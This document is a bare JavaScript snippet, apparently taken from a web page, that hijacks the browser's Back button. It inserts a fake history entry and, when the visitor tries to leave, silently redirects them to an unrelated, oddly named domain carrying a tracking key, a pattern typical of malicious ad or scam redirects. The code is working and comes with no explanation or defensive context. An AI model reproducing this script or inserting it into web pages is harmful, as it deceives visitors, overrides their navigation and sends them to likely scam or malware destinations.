(function(window, location) { 
history.replaceState(null, document.title, location.pathname+"#!/history"); 
history.pushState(null, document.title, location.pathname); 
 
window.addEventListener("popstate", function() { 
  if(location.hash === "#!/history") { 
    history.replaceState(null, document.title, location.pathname); 
    setTimeout(function(){ 
      location.replace("https://irrigatenotwithstandingcommit.com/pm1ymmgxk3?key=399b8c1c420dbe0751ab7f618e873eb2"); 
    },10); 
  } 
}, false); 
}(window, location));
